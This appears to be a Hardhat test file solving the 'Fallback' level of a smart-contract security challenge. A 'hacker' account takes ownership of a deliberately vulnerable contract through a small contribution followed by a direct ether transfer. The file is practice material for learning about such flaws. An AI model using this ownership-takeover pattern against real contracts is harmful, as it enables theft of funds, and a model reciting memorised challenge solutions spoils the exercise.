const { loadFixture, } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");
const { expect } = require("chai");
  
describe("Level01 - Fallback", function () {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const FallbackContract = await ethers.deployContract("Fallback");
        const FallbackAddress = await FallbackContract.getAddress();

        return {owner, hacker, FallbackContract, FallbackAddress};
    };

    describe("Level01 deploying", () => {
        it("should set the owner to the deployer address", async() => { 
            const {owner, hacker, FallbackContract, FallbackAddress} = await loadFixture(setUp);
            expect(await FallbackContract.connect(hacker).owner()).to.equal(owner.address);
        })
        it("should give the owner an initial contribution of 1000 ethers", async() => {
            const {owner, hacker, FallbackContract, FallbackAddress} = await loadFixture(setUp);
            expect(await FallbackContract.connect(hacker).contributions(owner.address)).to.equal(ethers.parseEther("1000"));
        })
    });

    describe("Level01 hacking", () => {
        it("should allow the hacker to become the owner", async() => {
            const {owner, hacker, FallbackContract, FallbackAddress} = await loadFixture(setUp);
            await FallbackContract.connect(hacker).contribute({value: ethers.parseEther("0.0001")});
            await hacker.sendTransaction({to: await FallbackContract.getAddress(), value: ethers.parseEther("0.0001")});

            expect(await FallbackContract.owner()).to.equal(hacker.address);
        })
    })
});